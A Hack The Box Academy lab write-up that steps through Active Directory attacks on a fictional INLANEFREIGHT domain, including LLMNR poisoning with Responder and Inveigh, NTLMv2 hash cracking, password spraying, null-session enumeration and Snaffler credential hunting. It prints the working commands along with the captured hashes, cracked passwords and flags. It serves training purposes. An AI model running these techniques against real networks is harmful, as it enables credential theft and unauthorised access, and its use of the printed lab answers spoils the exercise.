|`GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`|Impacket tool used to request (`-request`) the TGS ticket of an account in a target Windows domain (`-target-domain`) from a Linux-based host.|
|`bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`|Runs the Python implementation of `BloodHound` against a target Windows domain from a Linux-based host.|
|`zip -r ilfreight_bh.zip *.json`|Used to compress multiple files into 1 single `.zip` file to be uploaded into the BloodHound GUI.|

## Scenario 
## Assessment Scope

The following `IPs`, `hosts`, and `domains` defined below make up the scope of the assessment.
### In Scope For Assessment

| **Range/Domain**                | **Description**                                                                           |
| ------------------------------- | ----------------------------------------------------------------------------------------- |
| `INLANEFREIGHT.LOCAL`           | Customer domain to include AD and web services.                                           |
| `LOGISTICS.INLANEFREIGHT.LOCAL` | Customer subdomain                                                                        |
| `FREIGHTLOGISTICS.LOCAL`        | Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL |
| `172.16.5.0/23`                 | In-scope internal subnet.                                                                 |
### Out Of Scope

- `Any other subdomains of INLANEFREIGHT.LOCAL`
- `Any subdomains of FREIGHTLOGISTICS.LOCAL`
- `Any phishing or social engineering attacks`
- `Any other IPS/domains/subdomains not explicitly mentioned`
- `Any types of attacks against the real-world inlanefreight.com website outside of passive enumeration shown in this module`

### Setup

- A custom pentest VM within their internal network that calls back to our jump host, and we can SSH into it to perform testing.
- They've also given us a Windows host that we can load tools onto if need be.
- They've asked us to start from an unauthenticated standpoint but have also given us a standard domain user account (`htb-student`) which can be used to access the Windows attack host.
- "Grey box" testing. They have given us the network range 172.16.5.0/23 and no other information about the network.
- Non-evasive testing.

# Questions & Answers

### External Recon and Enumeration Principles

1.  While looking at inlanefreights public records; A flag can be seen. Find the flag and submit it. ( format == HTB{******} )

```c
dig inlanefreight.com ANY

; <<>> DiG 9.19.19-1-Debian <<>> inlanefreight.com ANY
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 50453
;; flags: qr rd ra; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: abd20f69b275832ff3d8f3f9673b6575e807e2b65997fd22 (good)
;; QUESTION SECTION:
;inlanefreight.com.             IN      ANY

;; ANSWER SECTION:
inlanefreight.com.      300     IN      SPF     "v=spf1 include:_spf.google.com include:mail1.inlanefreight.com include:google.com ~all"
inlanefreight.com.      300     IN      AAAA    2a03:b0c0:1:e0::32c:b001
inlanefreight.com.      300     IN      TXT     "HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}"
inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
inlanefreight.com.      900     IN      SOA     ns-161.awsdns-20.com. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400
inlanefreight.com.      240     IN      A       134.209.24.248
inlanefreight.com.      60      IN      NS      ns2.inlanefreight.com.
inlanefreight.com.      60      IN      NS      ns1.inlanefreight.com.

;; Query time: 276 msec
;; SERVER: 192.168.0.1#53(192.168.0.1) (TCP)
;; WHEN: Mon Nov 18 21:04:05 +05 2024
;; MSG SIZE  rcvd: 396

```


### Initial Enumeration of the Domain

2.  From your scans, what is the "commonName" of host 172.16.5.5 ?

 SSH to with user "htb-student" and password "HTB_@cademy_stdnt!"

For that we need to first ssh to the target and run nmap scan for local IP
```c
ssh htb-student@10.129.143.83
```

After that we can run nmap scan for the given internal IP
```c
sudo nmap 172.16.5.5 -A
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-21 04:12:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-21T04:13:49+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Not valid before: 2023-10-27T13:11:32
|_Not valid after:  2024-10-26T13:11:32
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-21T04:13:49+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Not valid before: 2023-10-27T13:11:32
|_Not valid after:  2024-10-26T13:11:32
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Not valid before: 2023-10-27T13:11:32
|_Not valid after:  2024-10-26T13:11:32
|_ssl-date: 2024-11-21T04:13:49+00:00; -1s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-21T04:13:49+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Not valid before: 2023-10-27T13:11:32
|_Not valid after:  2024-10-26T13:11:32
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-DC01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2024-11-21T04:13:42+00:00
| ssl-cert: Subject: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Not valid before: 2024-11-20T04:09:13
|_Not valid after:  2025-05-22T04:09:13
|_ssl-date: 2024-11-21T04:13:49+00:00; -1s from scanner time.
MAC Address: 00:50:56:B0:0A:EC (VMware)

Network Distance: 1 hop
Service Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-21T04:13:42
|_  start_date: N/A
|_nbstat: NetBIOS name: ACADEMY-EA-DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:0a:ec (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE
HOP RTT     ADDRESS
1   0.66 ms inlanefreight.local (172.16.5.5)

```

As we can see from the scan the commonName is  ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL which is under the RDP port 3389.

3.  What host is running "Microsoft SQL Server 2019 15.00.2000.00"? (IP address, not Resolved name)

Once we are logged in, we can run fping which validates which hosts are active in the `/23` network and does it quietly instead of spamming the terminal with results for each IP in the target list: `a` to show targets that are alive, `s` to print stats at the end of the scan, `g` to generate a target list from the CIDR network, and `q` to not show per-target results.
```c
fping -asgq 172.16.5.0/23
172.16.5.5
172.16.5.130
172.16.5.225

     510 targets
       3 alive
     507 unreachable
       0 unknown addresses

    2028 timeouts (waiting for response)
    2031 ICMP Echos sent
       3 ICMP Echo Replies received
    2028 other ICMP received

 0.046 ms (min round trip time)
 0.246 ms (avg round trip time)
 0.426 ms (max round trip time)
       14.276 sec (elapsed real time)

```

In our case the IP is 172.16.5.130


### LLMNR/NBT-NS Poisoning - from Linux

[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port `5355` over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port `137` over UDP.

4. Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.

SSH to with user "htb-student" and password "HTB_@cademy_stdnt!"

First we need to ssh to the target
```c
ssh htb-student@10.129.117.45
```

Then we can start responder
```c
sudo responder -I ens224
.
SNIP
.
[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:167a022c656db3ef:694E5A15AE9D4702548B97BF600C3EB7:010100000000000000A9331E9B41DB01FC0FA76D35313E090000000002000800310038003500480001001E00570049004E002D00480058003200590059004F00570050004D0038005A0004003400570049004E002D00480058003200590059004F00570050004D0038005A002E0031003800350048002E004C004F00430041004C000300140031003800350048002E004C004F00430041004C000500140031003800350048002E004C004F00430041004C000700080000A9331E9B41DB0106000400020000000800300030000000000000000000000000300000B80F4B2F9E68A03588EE6D8BA24DB3D95A6B5BC4E0D6AE6D5E9EF0E129849F960A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```

5.  Crack the hash for the previous account and submit the cleartext password as your answer.

To crack NTLMv2 Hash we can use hashcat. But first of all we need copy and paste the above hash to the file 
```c
hashcat -m 5600 backupagent-hash /usr/share/wordlists/rockyou.txt
h1backup55
```

6.  Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.

During the first run of the responder for question 4, I also got hash for wley user, so we can use the same technique as we used to crack hash in 5 question, to crack the hash of wley user
```c
hashcat -m 5600 wley-hash /usr/share/wordlists/rockyou.tx
transporter@4
```


### LLMNR/NBT-NS Poisoning - from Windows

7.  Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer. 

First we need to rdp to target. For some space reasons, the ordinary command xfreerdp is not working at the time I solve this question, so we gotta make it look like this:
```c
xfreerdp /u:htb-student /p:Academy_student_AD! /v:10.129.63.97 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution
```

After that we need to open powershell and use the Inveigh which listens to IPv4 and IPv6 and several other protocols, including LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, and Proxy Auth. The tool is available in the C:\Tools directory on the provided Windows attack host. Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file. We will leave the rest of the defaults, which can be seen here.

```c
PS C:\Tools> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
[*] Inveigh 1.506 started at 2024-12-02T10:53:19
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Tools
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
WARNING: [-] [2024-12-02T10:53:20] Error starting HTTP listener
WARNING: [!] [2024-12-02T10:53:20] Exception calling "Start" with "0" argument(s): "An attempt was made to access a socket in a way forbidden by its access permissions" $HTTP_listener.Start()
.
.
.
SNIP
.
.
.
[+] [2024-12-02T10:55:09] SMB(445) NTLM challenge A83DEB809AFB0D60 sent to 172.16.5.130:50357
[+] [2024-12-02T10:55:09] SMB(445) NTLMv2 captured for INLANEFREIGHT\svc_qualys from 172.16.5.130(ACADEMY-EA-FILE):50357:
svc_qualys::INLANEFREIGHT:A83DEB809AFB0D60:360DD79CC4392CF44851B5464635001C:01010000000000006DE3AFB5EB44DB01545C5D447833A7AB0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008006DE3AFB5EB44DB0106000400020000000800300030000000000000000000000000300000150415B15BF71BEBF22FD0A52EA818E90A0521AD9BB575D5A516914259E46E880A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
```

After we got the NTLMv2 hash of the user svc_qualys, we can crack it using the hashcat:
```c
hashcat -m 5600 svc_qualys-hash /usr/share/wordlists/rockyou.txt

SVC_QUALYS::INLANEFREIGHT:a83deb809afb0d60:360dd79cc4392cf44851b5464635001c:01010000000000006de3afb5eb44db01545c5d447833a7ab0000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00450041002d004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004600410043004100440045004d0059002d00450041002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008006de3afb5eb44db0106000400020000000800300030000000000000000000000000300000150415b15bf71bebf22fd0a52ea818e90a0521ad9bb575d5a516914259e46e880a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0035002e00320035000000000000000000:
security#1
```


Password spraying attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. 
Password Spray Visualization
Attack 	Username 	Password
1 	bob.smith@inlanefreight.local 	Welcome1
1 	john.doe@inlanefreight.local 	Welcome1
1 	jane.doe@inlanefreight.local 	Welcome1
DELAY 		
2 	bob.smith@inlanefreight.local 	Passw0rd
2 	john.doe@inlanefreight.local 	Passw0rd
2 	jane.doe@inlanefreight.local 	Passw0rd
DELAY 		
3 	bob.smith@inlanefreight.local 	Winter2022
3 	john.doe@inlanefreight.local 	Winter2022
3 	jane.doe@inlanefreight.local 	Winter2022


### Enumerating & Retrieving Password Policies

8. What is the default Minimum password length when a new domain is created? (One number) 

The default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:
Policy 	Default Value
Enforce password history 	24 days
Maximum password age 	42 days
Minimum password age 	1 day
Minimum password length 	7
Password must meet complexity requirements 	Enabled
Store passwords using reversible encryption 	Disabled
Account lockout duration 	Not set
Account lockout threshold 	0
Reset account lockout counter after 	Not set


10.  What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number) 

First we ssh to target
```c
ssh htb-student@10.129.7.200 
```

After that we need to discover devices in a specified network segment
```c
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.5: icmp_seq=1 ttl=128 time=1.54 ms
64 bytes from 172.16.5.225: icmp_seq=1 ttl=64 time=0.073 ms
```

So we see 2 internal ip addresses, let's start with the first one. We can use rpcclient with null session, enum4linux, or ldapsearch to find the password policy requirement about minimum length of the password in INLANEFREIGHT.LOCAL domain? I decided to use ldapsearch for that.
```c
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength                                                                               
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 5
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 8
modifiedCountAtLastProm: 0
nextRid: 1002
pwdProperties: 1
```


### Password Spraying - Making a Target User List

11.  Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint? 

For that we can use the following command which will count and find all the valid usernames
```c
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 12/03/24 - Ronnie Flathers @ropnop

2024/12/03 12:22:03 >  Using KDC(s):
2024/12/03 12:22:03 >   172.16.5.5:88

2024/12/03 12:22:03 >  [+] VALID USERNAME:       tjohnson@inlanefreight.local
2024/12/03 12:22:03 >  [+] VALID USERNAME:       jjones@inlanefreight.local
2024/12/03 12:22:03 >  [+] VALID USERNAME:       jwilson@inlanefreight.local
.
SNIP
.
2024/12/03 12:22:12 >  [+] VALID USERNAME:       whouse@inlanefreight.local
2024/12/03 12:22:12 >  [+] VALID USERNAME:       emercer@inlanefreight.local
2024/12/03 12:22:13 >  [+] VALID USERNAME:       wshepherd@inlanefreight.local
2024/12/03 12:22:19 >  Done! Tested 48705 usernames (56 valid) in 15.577 seconds
```


### Internal Password Spraying - from Linux

12. Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer. 

First we need to create usernames list. We can do that using ldapsearch, enum4linux, rpcclient 
```c
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

This will give us all usernames, which we can copy and paste to the new file and name it `valid_users.txt`. Also we can paste the selected usernames to our file in the attack machine, or transfer that entire file via python server for example. It will be needed in the future.

As we are sshed to target we can use crackmapexec with grep option to filter only successful attempt of password spraying for finding user starting with "s" with password Welcome1, also we can use kerbrute for that.
```c
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +   
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sgage:Welcome1 
```


### Internal Password Spraying - from Windows

13. Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer. 

First we rdp to target as usual 
```c
xfreerdp /u:htb-student /p:Academy_student_AD! /v:10.129.7.236 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution
```

After that as I wrote before, we need to use the usernames list which we obtained in the previous question, to conduct password spraying from windows now.
For this we will first create a file and name it `valid_users.txt` and paste all the usernames to it.
After that we need to open powershell and go to `Tools` directory and run the following commands
```c
PS C:\Tools> Import-Module .\DomainPasswordSpray.ps1
PS C:\Tools> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2940 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2940 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2940 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"):
[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Winter2022 against 2940 users. Current time is 10:04 AM
[*] Writing successes to spray_success
[*] SUCCESS! User:dbranch Password:Winter2022
206 of 2940 users tested
```

So I was wrong for thinking that we need to have the username lists in windows host as well. So we basically used auto-generated list from the DomainPasswordSpray tool and managed to find the correct username is seconds. So that was easier than I though.


### Credentialed Enumeration - from Linux

14. What AD User has a RID equal to Decimal 1170? 

First we need to ssh to the target host
```c
ssh htb-student@10.129.153.20
```

After that in order to get the list of all users we can use many methods as usual, but I will use rpcclient with null session
```c
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
.
.
SNIP
.
.
```

Then we can enum the users and get their RID which is in hex. As we need to find AD user with RID in decimal equals to 1170, we can convert 1170 to hex which is equal to 492
So we can run the following command which will find the user with that exact user RID

```c
rpcclient $> queryuser 0x492
        User Name   :   mmorgan
        Full Name   :   Matthew Morgan
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Thu, 10 Mar 2022 14:48:06 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Tue, 05 Apr 2022 15:34:55 EDT
        Password can change Time :      Wed, 06 Apr 2022 15:34:55 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x492
        group_rid:      0x201
        acb_info :      0x00010210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000018
        padding1[0..7]...
        logon_hrs[0..21]...

```

15.  What is the membercount: of the "Interns" group? 

As stated in the first passage of the module Credential Enumeration from Linux, we need to use the following credentials in our practice tasks `username:forend password:Klmcargo2`
So for that, CME (crackmapexec) is going to be our tool to get the amount of members in the "Intern" group
```c
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups                                                                                                                       
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)
. . . SNIP . . .
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Interns                                  membercount: 10
```


### Credentialed Enumeration - from Windows

16. Using Bloodhound, determine how many Kerberoastable accounts exist within the INLANEFREIGHT domain. (Submit the number as the answer)

So for that, first we need to RDP to our target
```c
xfreerdp /u:htb-student /p:Academy_student_AD! /v:10.129.7.236 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution
```

After that in order to determine how many kerberoastable accounts exist within our domain, we need to run bloodhound which is located in the C drive tools directory.
But first of all we will start by running the SharpHound.exe collector from the MS01 attack host, so we can exfiltrate the dataset to our own VM or ingest it into the BloodHound GUI tool on MS01
```c
PS C:\Tools> .\SharpHound.exe -c All --zipfilename ILFREIGHT

2022-04-18T13:58:22.1163680-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-04-18T13:58:22.1163680-07:00|INFORMATION|Initializing SharpHound at 1:58 PM on 4/18/2022
2022-04-18T13:58:22.6788709-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-04-18T13:58:23.0851206-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2022-04-18T13:58:53.9132950-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 67 MB RAM
2022-04-18T13:59:15.7882419-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-04-18T13:59:16.1788930-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-04-18T13:59:23.9288698-07:00|INFORMATION|Status: 3793 objects finished (+3793 63.21667)/s -- Using 112 MB RAM
2022-04-18T13:59:45.4132561-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2022-04-18T13:59:45.4601086-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2022-04-18T13:59:45.8663528-07:00|INFORMATION|Status: 3809 objects finished (+16 46.45122)/s -- Using 110 MB RAM
2022-04-18T13:59:45.8663528-07:00|INFORMATION|Enumeration finished in 00:01:22.7919186
2022-04-18T13:59:46.3663660-07:00|INFORMATION|SharpHound Enumeration Completed at 1:59 PM on 4/18/2022! Happy Graphing

```
To do that we run bloodhound into the searchbox. The above command will create a zip file which we need to upload to our bloodhound by clicking on the button `upload data` on the right side of the screen. After all files are loaded we need to close the window by pressing X. Then we need to type: `domain:` in the searchbox and select INLANEFREIGHT.LOCAL. Then we can see that we have Analysis tab on the left which also displays how many kerberoastable accounts are there. To display them in a graph we can press the `List all Kerberoastable Accounts` and then count the amount of them which in our case is 13.

18.  What PowerView function allows us to test if a user has administrative access to a local or remote host?


19. Run Snaffler and hunt for a readable web config file. What is the name of the user in the connection string within the file?

Snaffer is 
```c
PS C:\Tools> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


2024-12-24 12:05:05 -08:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\ADMIN$)
2024-12-24 12:05:05 -08:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\C$)
2024-12-24 12:05:05 -08:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares)
2024-12-24 12:05:05 -08:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\User Shares)
2024-12-24 12:05:05 -08:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\ZZZ_archive)
2024-12-24 12:05:33 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.sqldump$|310B|3/31/2022 12:05:02 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\AddPublish.sqldump) .sqldump
2024-12-24 12:05:33 -08:00 [File] {Red}<KeepExtExactRed|RW|^\.sqldump$|312B|3/31/2022 12:05:30 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\DenyRedo.sqldump) .sqldump
.
SNIP
.
2024-12-24 12:05:33 -08:00 [File] {Red}<KeepConfigRegexRed|RW|connectionstring[[:space:]]*=[[:space:]]*[\'\"][^\'\"].....*|253B|3/31/2022 12:12:43 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\web.config) <?xml version="1.0" encoding="utf-8"?>
<configuration>
  <connectionStrings>
    <add name="myConnectionString" connectionString="server=ACADEMY-EA-DB01;database=Employees;uid=sa;password=ILFREIGHTDB01!;" />
  </connectionStrings>
</configuration>
.
SNIP
.
2024-12-24 12:05:33 -08:00 [File] {Black}<KeepExtExactBlack|RW|^\.vhdx$|285B|3/31/2022 12:09:11 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Systems\WEB01-OLD.vhdx) .vhdx
Press any key to exit.
```

From the above output we can see that the username of the readable config file which is: `sa`

20.  What is the password for the database user?

From the previous output of snaffer